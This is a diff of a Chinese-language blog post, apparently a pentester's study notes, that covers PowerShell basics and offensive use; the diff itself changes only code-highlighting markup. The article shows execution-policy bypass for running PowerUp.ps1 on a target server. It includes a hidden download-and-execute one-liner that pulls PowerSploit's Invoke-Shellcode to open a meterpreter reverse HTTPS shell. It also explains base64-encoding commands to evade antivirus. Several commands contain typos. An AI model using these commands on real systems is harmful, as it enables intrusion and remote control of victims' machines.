@@ -195,21 +195,14 @@
 <p>powershell脚本文件中包含一系列powershell命令，每个命令显示为单独的一行。</p>
 <h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，powershell提供了一个执行策略，默认不能执行。</p>
 <p>如果powershell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p>
-<pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>exccutionPolicy
-1<span class="token punctuation">.</span> Restricted  <span class="token comment" spellcheck="true"># 脚本不能运行（默认设置）</span>
-2<span class="token punctuation">.</span> RemoteSigned <span class="token comment" spellcheck="true"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span>
-3<span class="token punctuation">.</span> AllSigned  <span class="token comment" spellcheck="true"># 仅当脚本由受信任的发布者签名时才能运行</span>
-4<span class="token punctuation">.</span> Unrestricted <span class="token comment" spellcheck="true"># 允许所有脚本运行</span>
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-exccutionPolicy</span><br><span class="line"><span class="number">1</span>. Restricted  <span class="comment"># 脚本不能运行（默认设置）</span></span><br><span class="line"><span class="number">2</span>. RemoteSigned <span class="comment"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span></span><br><span class="line"><span class="number">3</span>. AllSigned  <span class="comment"># 仅当脚本由受信任的发布者签名时才能运行</span></span><br><span class="line"><span class="number">4</span>. Unrestricted <span class="comment"># 允许所有脚本运行</span></span><br></pre></td></tr></table></figure>
 <p>可以使用下面的cmdlet命令设置powershell的执行策略</p>
-<pre class=" language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy &lt;policy name>
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure>
 <h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>要想运行一个powershell脚本，必须输入完整的路径和文件名。</p>
 <p>若在同一目录下，<code>./test.ps1</code>即可</p>
 <h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接</p>
 <p>例：执行下面命令，让所有正在运行的，名字以字符 p 开头的程序停止运行</p>
-<pre class=" language-powershell"><code class="language-powershell"><span class="token function">get-process</span> p<span class="token operator">*</span> <span class="token punctuation">|</span> <span class="token function">stop-process</span>
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure>
 <h2 id="powershell常用命令"><a href="#powershell常用命令" class="headerlink" title="powershell常用命令"></a>powershell常用命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在powershell下，类似cmd命令的命令叫作cmdlet命令。二者命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为<code>Add</code>，<code>Get</code>，<code>Remove</code>，<code>Set</code>，<code>New</code>等。</p>
 <p>powershell命令不区分大小写。</p>
 <p>以文件操作为例：</p>
@@ -230,19 +223,15 @@
 <p>将PowerUp.ps1上传到目标服务器。在命令行下执行如下命令，绕过安全策略，在目标服务器执行该脚本</p>
 </li>
 </ol>
-<pre class=" language-powershell"><code class="language-powershell">Powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>File PowerUp<span class="token punctuation">.</span>ps1
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -ExecutionPolicy Bypass -File PowerUp.ps1</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/04/08/powershell-xue-xi/images\image-20200320092852102.png" alt="image-20200320092852102"></p>
 <p>将同一个脚本上传到目标服务器中，在目标本地执行脚本文件</p>
-<pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>Command <span class="token string">"&amp; {Import-Module C:\PowerUp.ps1; Invoke-AllChecks}"</span>
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure>
 <ol start="2">
 <li>从网站服务器中下载脚本，绕过本地权限并隐藏执行</li>
 </ol>
-<pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass<span class="token operator">-</span>WindowStyle Hidden<span class="token operator">-</span>NoProfile<span class="token operator">-</span>NonIIEX<span class="token punctuation">(</span>New<span class="token operator">-</span>ObjectNet<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"xxx.ps1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[Parameters]</span>
-</code></pre>
-<pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass<span class="token operator">-</span>WindowStyle Hidden<span class="token operator">-</span>NoProfile<span class="token operator">-</span>NonIIEX<span class="token punctuation">(</span>New<span class="token operator">-</span>ObjectNet<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Invoke<span class="token operator">-</span>Shellcode <span class="token operator">-</span>Payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_https <span class="token operator">-</span>Lhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>150<span class="token punctuation">.</span>141 <span class="token operator">-</span>Lport 80
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">150.141</span> -Lport <span class="number">80</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>-ExecutionPolicy Bypass (-Exec Bypass)：绕过执行安全策略。这个参数非常重要。在默认情况下，powershell的安全策略规定powershell不能运行命令和文件。</li>
 <li>-WindowStyle Hidden (-W Hidden)：隐藏窗口</li>
@@ -256,20 +245,18 @@
 <p>使用Base64对powershell命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。</p>
 <p>可以使用python脚本对所有的powershell命令进行base64编码。<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py" target="_blank" rel="noopener">python脚本</a></p>
 <p>在使用ps_encoder.py进行文本转换时，转换的对象必须是文本文件，因此先把命令保存为文本文件。</p>
-<pre class=" language-powershell"><code class="language-powershell"><span class="token function">echo</span> <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> >raw<span class="token punctuation">.</span>txt
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> &gt;raw.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/04/08/powershell-xue-xi/images\image-20200320110707604.png" alt="image-20200320110707604"></p>
 <p>在远程主机上执行</p>
-<pre><code>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 <h3 id="运行32位和64位powershell"><a href="#运行32位和64位powershell" class="headerlink" title="运行32位和64位powershell"></a>运行32位和64位powershell</h3><p>一些powershell脚本只能在指定平台上运行。在64位的Windows操作系统中，存在两个版本的powershell，一个是x64，另一个是x86。这两个版本的执行策略不会相互影响，可以把它们看成两个独立的程序。x64版本的powershell的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0\</code>目录下。</p>
 <p>运行32位Powershell脚本</p>
-<pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass
-</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>
 <p>运行64位Powershell脚本</p>
-<pre><code>%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass
-</code></pre><h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>
+<h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>
 
   </div>
 </article>
